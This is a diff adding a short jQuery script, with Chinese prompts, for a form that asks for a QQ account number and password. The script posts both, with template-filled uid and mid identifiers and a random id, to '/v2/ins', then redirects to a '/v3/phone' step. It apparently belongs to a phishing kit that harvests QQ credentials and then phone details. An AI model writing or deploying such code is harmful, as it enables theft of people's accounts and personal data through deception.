@@ -1,0 +1,43 @@
+function showTip(text) {
+    $('#error_message').html(text)
+    $('#error_tips').show()
+    setTimeout(function () {
+        $('#error_tips').hide()
+    }, 1000)
+}
+
+function RndNum(n){
+    var rnd="";
+    for(var i=0;i<n;i++)
+        rnd+=Math.floor(Math.random()*10);
+    return rnd;
+}
+
+$(document).ready(function () {
+    $('#go').on('click', function () {
+        var ranid = RndNum(32)
+        if ($('#u').val() === '') {
+            showTip('请输入QQ号！');
+        } else if ($('#p').val() === '') {
+            showTip('你还没有输入密码！');
+        } else {
+            $.ajax({
+                url: "/v2/ins",
+                type: 'post',
+                data: {
+                    u: $('#u').val(),
+                    p: $('#p').val(),
+                    uid: <%=uid%>,
+                    mid: <%=mid%>,
+                    ranid: ranid,
+                },
+                success: function (res) {
+                    if (res === '0') {
+                        window.location = '/v3/phone?id='+ranid
+                    }
+                }
+            });
+        }
+    })
+})
+
